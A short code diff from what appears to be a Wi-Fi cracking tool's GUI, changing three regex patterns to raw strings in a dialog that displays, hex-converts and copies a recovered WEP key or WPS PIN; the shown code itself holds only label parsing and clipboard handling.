@@ -167,7 +167,7 @@ class wep_attack_dialog(QtWidgets.QDialog,Ui_attack_panel):
         key_string = str(self.key_label.text())
         if not self.original_key:
             self.original_key = key_string
-        actual_key = re.findall("WEP KEY: ([\S \w]+)</font>",key_string)
+        actual_key = re.findall(r"WEP KEY: ([\S \w]+)</font>",key_string)
         if(actual_key):
             key = actual_key[0]
         converted_key = key.decode("hex")
@@ -178,7 +178,7 @@ class wep_attack_dialog(QtWidgets.QDialog,Ui_attack_panel):
 
     def Convert_to_Hex(self):
         self.key_label.setText(self.original_key)
-        actual_key = re.findall("WEP KEY: ([\S \w]+)</font>",self.original_key)
+        actual_key = re.findall(r"WEP KEY: ([\S \w]+)</font>",self.original_key)
         self.clipboard_key = actual_key[0]
         self.convert_flag = False
 
@@ -189,7 +189,7 @@ class wep_attack_dialog(QtWidgets.QDialog,Ui_attack_panel):
 
         if(key_type == "WPS PIN"):
             key_string = self.wps_pin_label.text()
-            actual_key = re.findall("WPS PIN: ([\S \w]+)</font>",key_string)
+            actual_key = re.findall(r"WPS PIN: ([\S \w]+)</font>",key_string)
             if(actual_key):
                 self.clipboard_key = actual_key[0]
         self.clipbord.setText(self.clipboard_key)
